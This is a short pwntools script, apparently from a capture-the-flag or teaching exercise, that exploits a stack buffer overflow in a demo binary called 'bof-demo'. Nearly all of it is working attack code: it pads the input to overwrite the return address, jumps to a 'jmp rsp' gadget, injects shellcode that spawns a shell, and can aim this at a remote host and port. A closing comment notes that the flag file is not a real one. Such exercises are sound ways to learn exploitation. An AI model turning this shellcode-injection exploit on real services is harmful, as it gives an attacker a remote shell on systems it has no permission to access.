from pwn import *

HOST = args.HOST or '192.168.20.1'
PORT = int(args.PORT or 5280+1)
EXE_FILENAME = '../bof-demo'
OFFSET_RIP = 88
JMP_RSP = 0x40127d

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}

def start():
    if args.REMOTE:
        return remote(HOST,PORT)
    return process(argv=argv, env=envp)

io = start()
io.recvuntil(b'name?')
io.sendline(b'a' * OFFSET_RIP + p64(JMP_RSP) + asm(shellcraft.sh()))
io.interactive()

'''
$ cat not-real-flag.txt
In real challenges you'll find a "flag.txt", or similarly named file, containing the actual flag.
'''
